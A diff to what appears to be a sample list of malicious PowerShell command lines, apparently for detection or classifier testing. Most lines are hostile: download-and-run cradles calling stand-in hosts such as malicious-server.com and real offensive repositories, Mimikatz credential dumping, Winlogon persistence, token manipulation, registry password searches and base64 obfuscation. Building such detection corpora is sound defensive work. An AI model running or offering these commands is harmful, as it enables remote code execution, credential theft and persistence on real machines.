@@ -5,7 +5,7 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 ls -recurse ; get-childitem -recurse ; gci -recurse
 $Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke
 powershell -exec bypass -command "Invoke-Mimikatz -DumpCreds"
-powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"
+powershell.exe -c "Get-CimInstance -class win32_operatingsystem | select -property * | export-csv msdebug.log"
 powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');"
 Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
 Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe
@@ -22,20 +22,16 @@ powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadStri
 Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'
 powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')"
 powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')}
-powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-Get-WMIObject Win32_Group
+Get-CimInstance Win32_Group
 Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
 $payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz")
 powershell.exe -exec bypass -c "Invoke-Mimikatz"
 $payload = 'IEX (New-Object Net.WebClient).DownloadString("http://somesurl.com/juve.ps1")'; Invoke-Expression $payload
-Get-WmiObject -Class Win32_UserAccount
-Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)
+Get-CimInstance -Class Win32_UserAccount
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content"
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, ${binaryToExec}" -Force
 dir
-Invoke-ExecuteMSBuild
-Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe'
-$pattern = "password";$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG";foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" };foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
+$pattern = "password";$hives = "HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG";foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" };foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
 $originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString
 iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes
 Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'
